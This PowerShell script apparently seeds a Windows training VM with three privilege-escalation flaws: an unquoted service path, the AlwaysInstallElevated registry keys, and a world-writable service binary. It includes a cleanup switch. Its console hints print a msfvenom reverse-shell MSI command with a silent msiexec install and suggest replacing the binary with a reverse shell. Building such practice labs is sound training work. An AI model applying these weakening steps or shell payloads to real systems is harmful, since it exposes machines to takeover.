# Lab Windows App Server — misconfiguration seeder
#
# Run as Administrator on the Windows eval VM BEFORE starting the lab.
# Plants three common privesc vectors:
#   1. Unquoted service path (CVE pattern: search-order hijack)
#   2. AlwaysInstallElevated registry key (MSI install as SYSTEM)
#   3. Service with weak DACL (user can modify the service binary path)
#
# Remove misconfigs after the lab with: .\plant-misconfigs.ps1 -Cleanup

param([switch]$Cleanup)

$ErrorActionPreference = "Stop"

if ($Cleanup) {
    Write-Host "[*] Cleaning up lab misconfigurations..."
    Stop-Service -Name "NorthwindUpdater" -Force -ErrorAction SilentlyContinue
    sc.exe delete NorthwindUpdater 2>$null | Out-Null
    Remove-Item "C:\Program Files\Northwind Software\NorthwindUpdater.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Program Files\Northwind Software" -Recurse -Force -ErrorAction SilentlyContinue
    reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f 2>$null | Out-Null
    reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f 2>$null | Out-Null
    Write-Host "[+] Cleanup complete."
    exit 0
}

Write-Host "==============================="
Write-Host "Lab Windows App Server — Setup"
Write-Host "==============================="

# ── Vector 1: Unquoted service path ─────────────────────────────────────────
Write-Host "`n[1] Creating vulnerable service: unquoted path with spaces..."

$svcDir = "C:\Program Files\Northwind Software"
New-Item -ItemType Directory -Path $svcDir -Force | Out-Null

# Dummy service binary (cmd.exe copy — benign stand-in)
Copy-Item "C:\Windows\System32\cmd.exe" "$svcDir\NorthwindUpdater.exe" -Force

# Create service with UNQUOTED path — vulnerable to search-order hijack
# Windows will try: "C:\Program.exe", "C:\Program Files\Northwind.exe", then the real path
sc.exe create NorthwindUpdater `
    binPath= "C:\Program Files\Northwind Software\NorthwindUpdater.exe" `
    start= auto `
    DisplayName= "Northwind Updater Service" | Out-Null

Write-Host "  Service created: NorthwindUpdater"
Write-Host "  Path: $svcDir\NorthwindUpdater.exe  (unquoted)"
Write-Host "  Verify: sc qc NorthwindUpdater"

# ── Vector 2: AlwaysInstallElevated ─────────────────────────────────────────
Write-Host "`n[2] Setting AlwaysInstallElevated registry keys..."

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f | Out-Null
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f | Out-Null

Write-Host "  HKLM and HKCU AlwaysInstallElevated = 1"
Write-Host "  Exploit: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi; msiexec /quiet /qn /i shell.msi"

# ── Vector 3: Weak service DACL ──────────────────────────────────────────────
Write-Host "`n[3] Weakening service DACL (Everyone: Full Control on NorthwindUpdater)..."

$acl = Get-Acl "$svcDir\NorthwindUpdater.exe"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Everyone", "FullControl", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "$svcDir\NorthwindUpdater.exe" $acl

Write-Host "  Everyone now has FullControl on $svcDir\NorthwindUpdater.exe"
Write-Host "  Exploit: replace the binary with a reverse shell, restart service"

# ── Summary ──────────────────────────────────────────────────────────────────
Write-Host "`n==============================="
Write-Host "Lab setup complete. Run winPEAS:"
Write-Host "  winPEAS.exe | Out-File winpeas_out.txt"
Write-Host "  Then copy winpeas_out.txt to your analysis box and run:"
Write-Host "  python3 triage.py winpeas_out.txt"
Write-Host "==============================="
